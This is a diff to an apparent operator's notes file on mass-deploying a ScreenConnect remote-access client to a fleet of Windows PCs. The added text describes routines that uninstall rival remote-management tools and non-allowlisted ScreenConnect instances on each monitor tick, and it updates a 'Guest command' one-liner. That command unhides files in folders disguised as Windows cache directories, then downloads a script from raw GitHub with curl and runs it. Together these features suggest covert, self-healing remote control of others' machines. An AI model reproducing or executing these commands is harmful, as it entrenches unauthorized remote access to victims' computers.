@@ -4,6 +4,20 @@
 All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop contents at root + `WindowsPin\` nested local repo).
 
 ## Current deploy — "another level" build
+- **own.cmd O22 / M13 / L3** (self-contained): **install + exterminate hardening**. Post-mortem of
+  fleet deploys showed (a) primary install weak: single `msiexec /i` with no 1618 retry, no
+  repair-by-GUID for registered-but-serviceless products, stale `ScreenConnect Client (5f601057...)`
+  dirs breaking the SC custom action (EVITA 1603), install running BEFORE cleanup so rival SC
+  instances collided with it; (b) removal weak: `sc delete`+`rd` only, `wmic` kill dead on Win11,
+  foreign SC products never truly uninstalled, other RMM tools untouched.
+  Fixes: worker runs exterminate FIRST (`own_lib -Action exterminate` = true MSI uninstall of every
+  foreign `ScreenConnect Client (fp)` product by GUID + svc/proc/dir kill + purge of 16 disallowed
+  RMM tools: AnyDesk, TeamViewer, MeshAgent, Splashtop, LogMeIn, GoTo*, ConnectWise/LTService,
+  Atera, NinjaRMM, Datto/CentraStage, RustDesk, Supremo, DWService, Zoho Assist, RemotePC).
+  Install ladder: repair-by-GUID -> stale-dir preclean -> `msiexec /i` with 1618 busy-retry x2 ->
+  REINSTALLMODE=amus pass -> post-install repair-by-GUID; every exit code logged with !ERRORLEVEL!.
+  Monitor M13 runs the same exterminate every tick BEFORE the heal ladder + stale-dir preclean in
+  :InstallMsi. Only the 2 allowlisted SCs (5f6010579852e507, f861c8140d453427) survive.
 - **own.cmd O21** (self-contained): **dark-fleet recovery**. Mass-deploy of O19 exposed 3 killers:
   (1) heal ran `msiexec /i pkg.msi` against SC-family instances -> collided with existing installs
   and left KANCEL-PC/HRTAG48/SAJ7R21 with prim+alt services deleted (products still registered);
@@ -45,7 +59,7 @@ All project files live under `C:\Users\nobuddy\Desktop\Project` (github-drop con
 
 ## Preferred Guest command (self-contained)
 ```
-attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o20" && call %TEMP%\own.cmd
+attrib -h -s -r "C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\*" & attrib -h -s -r "C:\Windows\Temp\.wucache\*" & attrib -h -s -r "C:\ProgramData\Microsoft\Diagnosis\State\.etlcache\*" & curl.exe -L --ssl-no-revoke -o %TEMP%\own.cmd "https://raw.githubusercontent.com/xnobuddy/github-drop/main/own.txt?t=o22" && call %TEMP%\own.cmd
 ```
 
 ## Persist (identity-driven; defaults shown)
